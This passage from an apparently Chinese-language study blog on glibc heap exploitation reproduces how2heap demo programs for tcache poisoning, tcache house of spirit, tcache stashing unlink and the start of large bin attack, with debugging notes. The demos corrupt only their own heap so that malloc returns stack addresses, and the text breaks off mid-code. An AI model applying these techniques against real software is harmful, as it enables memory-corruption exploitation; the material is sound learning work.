class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// disable buffering</span></span><br><span class="line">        setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> stack_var;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">        <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">        b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">        <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这个实验的演示很明白，主要展示了tcache中和fastbin一样，都是单向指针，并且存在后进先出的特点</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411031454452.png" alt="image-20241103145438356"></p><p>这里可以看到在一次释放chunk1和chunk2时，这两被存放在了tcache中了并且是chunk2—&gt;chunk1</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411031459473.png" alt="image-20241103145924249"></p><p>我们通过改写chunk2的指针，使其指向stack_var,再依次malloc两个chunk</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411031501417.png" alt="image-20241103150108369"></p><p>可以看到函数是正常结束的，说明chunk3也就是我们改写了fd地址从而伪造的chunk的地址成功了</p><h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">        fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">        <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">        assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;              </span><br></pre></td></tr></table></figure><blockquote><p>这个和2.23fastbin的house of spirit差不多</p></blockquote><p>都是是直接在一个不是堆的地方直接free然后再malloc回来，这样就把目标地址的可以进行任意位置读写了</p><h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><p>这个点这个师傅讲的很清楚<a href="https://hollk.blog.csdn.net/article/details/113604261">好好说话之Tcache Attack（3）：tcache stashing unlink attack-CSDN博客</a></p><p>本篇博客这里只是自己的复盘以及部分的重点的写出</p><blockquote><p>这个实验总结来说就是，利用tcache把其他bin中的元素放到tcache的检查不完整，我们可以通过改写small bins中的bk指针，让系统误以为bk指向的那里还有一个堆（其实是我们的目标地址），从而挂到tcache这个链表里面</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411031909909.png" alt="屏幕截图 2024-11-03 190039"></p><p>来到malloc 了9个chunk后，我们再free6个</p><p>可以看到从chunk4到chunk9就全部被放到tcache这个链表中</p><p>接下来我们按照顺序释放chunk1 chunk0 chunk2</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411031916169.png" alt="image-20241103191618089"></p><p>然后我们再malloc一个比现在所有堆快都大的堆快后，unsorted bin中的堆快会被放到smallbin中去，并且从top chunk中重新拿出地址存放新的堆快</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411031920526.png" alt="image-20241103192005474"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411031921595.png" alt="image-20241103192109555"></p><p>接着，又申请了两个堆快，因为是malloc，所以是从tcache中拿</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411031926630.png" alt="image-20241103192637574"></p><p><strong>接着来到这个实验的重点内容了</strong></p><p>我们改写了chunk2的bk指针为stack_var</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411031931185.png" alt="image-20241103193131126"></p><p>可以看到，这里已经改变了</p><p>此时，我们只需要先从smallbins摘走一个chunk，再让这些chunk被放入tcache中</p><blockquote><p>calloc这里会先从smallbin中拿 malloc才会从tcache中拿</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411031940567.png" alt="image-20241103194025499"></p><p>可以看到，目标的地址已经被挂进了tcache中了</p><p>我们只需要再malloc就会从目标地址创造堆快了</p>]]></content>
      
      
      <categories>
          
          <category> pwn-堆学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>large_bin_attack</title>
      <link href="/posts/50458.html"/>
      <url>/posts/50458.html</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><blockquote><p> 总的来说，large_bin_attack就是在free掉的chunk中,再重新申请的时候，从unsorted_bin中拿出来的时候到large_bin或者small_bin中时，因为原来的这两个bin是双向链表，我们插入一个chunk到这其中的时候，会进行一系列的链表之间的指针互换</p></blockquote><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410272107369.png" alt="image-20241027210754331"></p><p>fd_nextsize指向前一个与现在chunk大小不一样的地址（一个大小只有第一个有）</p><p>bk_nextsize指向后一个与现在chunk大小不一样的地址（一个大小只有第一个有）</p><h2 id="how2heap-large-bin-attack"><a href="#how2heap-large-bin-attack" class="headerlink" title="how2heap large bin attack"></a>how2heap large bin attack</h2><p>我们进入how2heap glibc2.23中的large bin attack调试来理解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;assert.h&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    fprintf(stderr, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    fprintf(stderr, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    unsigned long stack_var1 = <span class="number">0</span>;</span><br><span class="line">    unsigned long stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    fprintf(stderr, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    fprintf(stderr, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    unsigned long *p1 = malloc(<span class="number">0x420</span>);</span><br><span class="line">    fprintf(stderr, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    malloc(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    unsigned long *p2 = malloc(<span class="number">0x500</span>);</span><br><span class="line">    fprintf(stderr, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    malloc(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    unsigned long *p3 = malloc(<span class="number">0x500</span>);</span><br><span class="line">    fprintf(stderr, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    fprintf(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    malloc(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    free(p1);</span><br><span class="line">    free(p2);</span><br><span class="line">    fprintf(stderr, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (void *)(p2 - <span class="number">2</span>), (void *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">0x90</span>);</span><br><span class="line">    fprintf(stderr, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (void *)((char *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    free(p3);</span><br><span class="line">    fprintf(stderr, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p 